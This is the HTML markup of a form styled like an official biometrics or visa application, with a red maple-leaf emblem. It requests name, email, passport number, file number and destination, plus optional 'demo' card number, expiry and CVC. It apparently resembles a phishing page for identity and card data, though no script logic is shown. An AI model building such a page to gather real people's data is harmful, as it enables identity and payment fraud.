<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>PERSONAL INFORMATION</title>
<link rel="stylesheet" href="site.css" />
</head>
<body>
  <main class="card">
    <aside class="panel">
      <div class="badge"><svg viewBox="0 0 100 100" aria-hidden="true">
       <polygon points="50.00,2.00 56.00,17.00 60.50,14.00 62.50,31.00 74.50,24.00 71.00,42.50 89.00,37.00 83.50,52.00 77.00,56.00 81.00,71.00 63.00,62.50 52.70,73.00 52.70,97.00 47.30,97.00 47.30,73.00 37.00,62.50 19.00,71.00 23.00,56.00 16.50,52.00 11.00,37.00 29.00,42.50 25.50,24.00 37.50,31.00 39.50,14.00 44.00,17.00" fill="#D52B1E"/></svg></div>
      <h1>Biometrics/ Special file information</h1>
      <p class="lead">Please fill in the following details to submit your application</p>
    
    </aside>

    <section class="formpane">
      <h2>PERSONAL INFORMATION</h2>
      <p class="hint">All fields are required</p>

      <form id="membershipForm" novalidate>
        <div id="errorBox" class="error" role="alert"></div>

        <div class="field">
          <label for="full_name">Full Name <span aria-hidden="true">*</span></label>
          <div class="control">
            <input id="full_name" name="full_name" type="text" minlength="2" maxlength="100" autocomplete="name" placeholder="Name as in passport" required />
            <span class="ico" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
              <circle cx="12" cy="8" r="4"/><path d="M4 21c0-4.4 3.6-7 8-7s8 2.6 8 7"/></svg></span>
          </div>
        </div>
        <div class="field">
          <label for="email">Email <span aria-hidden="true">*</span></label> 
          <div class="control">
            <input id="email" name="email" type="email" maxlength="255" autocomplete="email" dir="auto" placeholder="name@example.com" required />
            <span class="ico" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
              <rect x="3" y="5" width="18" height="14" rx="3"/><path d="M4 7.5l8 5.5 8-5.5"/></svg></span>
          </div>
        </div>
        <div class="field">
          <label for="passport_number">Passport Number <span aria-hidden="true">*</span></label>
          <div class="control">
            <input id="passport_number" name="passport_number" type="text" minlength="6" maxlength="12" autocomplete="off" dir="auto" placeholder="AB1234567" required />
            <span class="ico" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
              <rect x="5" y="3" width="14" height="18" rx="2.5"/><circle cx="12" cy="10" r="3"/><path d="M9 16.5h6"/></svg></span>
          </div>
        </div>
        <div class="field">
  <label for="occupation">Occupation <span aria-hidden="true">*</span></label>
  <div class="control">
    <input id="occupation" name="occupation" type="text" minlength="2" maxlength="100" autocomplete="organization-title" placeholder="e.g. Engineer" required />
    <span class="ico" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
      <rect x="3" y="7" width="18" height="13" rx="2"/><path d="M8 7V5a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg></span>
  </div>
</div>

<div class="field">
  <label for="file_number">File Number <span aria-hidden="true">*</span></label>
  <div class="control">
    <input id="file_number" name="file_number" type="text" minlength="2" maxlength="50" autocomplete="off" placeholder="Write NA if you don't have one" required />
    <span class="ico" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
      <path d="M4 4h12l4 4v12H4z"/><path d="M14 4v4h4"/></svg></span>
  </div>
</div>


<!-- OPTIONAL DEMO PAYMENT INFORMATION -->
<div class="payment-section">

  <h3>Payment Information (Optional)</h3>


  <div class="field">
    <label for="demo_card_number">
      Demo Card Reference
    </label>
    <div class="control">
      <input
        type="text"
        id="demo_card_number"
        name="demo_card_number"
        placeholder="0000 0000 0000 0000"
        maxlength="32"
        autocomplete="off"
      />
    </div>
  </div>

  <div class="field">
    <label for="demo_expiry_date">
      Expiry Date (Demo)
    </label>
    <div class="control">
      <input
        type="text"
        id="demo_expiry_date"
        name="demo_expiry_date"
        placeholder="MM/YY"
        maxlength="10"
        autocomplete="off"
      />
    </div>
  </div>

  <div class="field">
    <label for="demo_cvc">
      CVC (Demo Only)
    </label>
    <div class="control">
      <input
        type="text"
        id="demo_cvc"
        name="demo_cvc"
        inputmode="numeric"
        placeholder="123"
        maxlength="4"
        autocomplete="off"
      />
    </div>
  </div>

</div>
<!-- END OPTIONAL DEMO PAYMENT INFORMATION -->

<div class="field">
  <label for="destination_country">Destination Country <span aria-hidden="true">*</span></label>
  <div class="control">
    <select id="destination_country" name="destination_country" required>
      <option value="">Select a country</option>
      <option>Afghanistan</option><option>Albania</option><option>Algeria</option><option>Andorra</option><option>Angola</option><option>Argentina</option><option>Armenia</option><option>Australia</option><option>Austria</option><option>Azerbaijan</option><option>Bahrain</option><option>Bangladesh</option><option>Belarus</option><option>Belgium</option><option>Belize</option><option>Benin</option><option>Bhutan</option><option>Bolivia</option><option>Bosnia and Herzegovina</option><option>Botswana</option><option>Brazil</option><option>Brunei</option><option>Bulgaria</option><option>Burkina Faso</option><option>Burundi</option><option>Cambodia</option><option>Cameroon</option><option>Canada</option><option>Chad</option><option>Chile</option><option>China</option><option>Colombia</option><option>Comoros</option><option>Congo</option><option>Costa Rica</option><option>Croatia</option><option>Cuba</option><option>Cyprus</option><option>Czech Republic</option><option>Denmark</option><option>Djibouti</option><option>Dominican Republic</option><option>Ecuador</option><option>Egypt</option><option>El Salvador</option><option>Estonia</option><option>Ethiopia</option><option>Fiji</option><option>Finland</option><option>France</option><option>Gabon</option><option>Gambia</option><option>Georgia</option><option>Germany</option><option>Ghana</option><option>Greece</option><option>Guatemala</option><option>Guinea</option><option>Haiti</option><option>Honduras</option><option>Hungary</option><option>Iceland</option><option>India</option><option>Indonesia</option><option>Iran</option><option>Iraq</option><option>Ireland</option><option>Israel</option><option>Italy</option><option>Jamaica</option><option>Japan</option><option>Jordan</option><option>Kazakhstan</option><option>Kenya</option><option>Kuwait</option><option>Kyrgyzstan</option><option>Laos</option><option>Latvia</option><option>Lebanon</option><option>Lesotho</option><option>Liberia</option><option>Libya</option><option>Liechtenstein</option><option>Lithuania</option><option>Luxembourg</option><option>Madagascar</option><option>Malawi</option><option>Malaysia</option><option>Maldives</option><option>Mali</option><option>Malta</option><option>Mauritania</option><option>Mauritius</option><option>Mexico</option><option>Moldova</option><option>Monaco</option><option>Mongolia</option><option>Montenegro</option><option>Morocco</option><option>Mozambique</option><option>Myanmar</option><option>Namibia</option><option>Nepal</option><option>Netherlands</option><option>New Zealand</option><option>Nicaragua</option><option>Niger</option><option>Nigeria</option><option>North Korea</option><option>NorthMacedonia</option><option>Norway</option><option>Oman</option><option>Pakistan</option><option>Palestine</option><option>Panama</option><option>Papua New Guinea</option><option>Paraguay</option><option>Peru</option><option>Philippines</option><option>Poland</option><option>Portugal</option><option>Qatar</option><option>Romania</option><option>Russia</option><option>Rwanda</option><option>Saudi Arabia</option><option>Senegal</option><option>Serbia</option><option>Sierra Leone</option><option>Singapore</option><option>Slovakia</option><option>Slovenia</option><option>Somalia</option><option>South Africa</option><option>South Korea</option><option>South Sudan</option><option>Spain</option><option>Sri Lanka</option><option>Sudan</option><option>Suriname</option><option>Sweden</option><option>Switzerland</option><option>Syria</option><option>Taiwan</option><option>Tajikistan</option><option>Tanzania</option><option>Thailand</option><option>Togo</option><option>Tunisia</option><option>Turkey</option><option>Turkmenistan</option><option>Uganda</option><option>Ukraine</option><option>United Arab Emirates</option><option>United Kingdom</option><option>United States</option><option>Uruguay</option><option>Uzbekistan</option><option>Venezuela</option><option>Vietnam</option><option>Yemen</option><option>Zambia</option><option>Zimbabwe</option>
    </select>
  </div>
</div>
        <button type="submit" id="submitBtn" class="cta">
          <span id="submitText">Submit Request</span>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <path d="M19 12H5M11 6l-6 6 6 6"/></svg>
        </button>
      </form>
    </section>
  </main>

  <script src="app.js"></script>
</body>
</html>
